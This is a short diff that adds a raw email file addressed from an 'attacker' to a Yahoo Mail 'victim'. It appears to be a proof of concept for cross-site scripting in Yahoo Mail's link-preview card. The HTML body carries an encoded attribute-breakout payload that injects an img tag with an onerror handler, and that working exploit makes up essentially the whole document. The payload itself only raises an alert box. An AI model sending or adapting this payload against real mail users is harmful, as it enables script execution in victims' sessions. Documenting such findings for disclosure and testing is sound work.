@@ -1,0 +1,10 @@
+From: <attacker@attacker.com>
+Subject: hello
+To: victim@yahoo.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<div class="yahoo-link-enhancr-card" data-url="https://www.youtube.com/aaa&quot;&gt;&lt;img src=x onerror=alert(/xss/)&gt;&lt;">
+<div class="card-share-container">
+<a class="enhancr-play-btn"></a>
+</div></div>
